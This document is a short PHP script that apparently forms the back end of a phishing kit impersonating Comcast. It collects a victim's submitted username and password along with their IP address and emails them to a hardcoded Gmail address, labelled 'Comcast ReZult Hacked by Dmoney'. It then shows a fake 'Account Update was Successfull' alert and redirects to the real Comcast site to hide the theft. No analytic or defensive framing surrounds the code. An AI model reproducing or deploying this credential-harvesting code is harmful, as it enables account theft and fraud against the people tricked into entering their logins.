<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Email or username : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$mesaj = "Comcast ReZult Hacked by Dmoney
Yahoo User : $username
Password : $passwd
----------------------------------------------------
IP : $ip 
DATE : $datamasii
";
mail($recipient,$subject,$message);

$recipient = "mickeyboyoboy@gmail.com";
$subject = "New!Comcast!ReZult!";
$headers = "From: Comcast <darego@darego.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "Comcast", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Account Update was Successfull!!!');
window.location='http://www.comcast.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>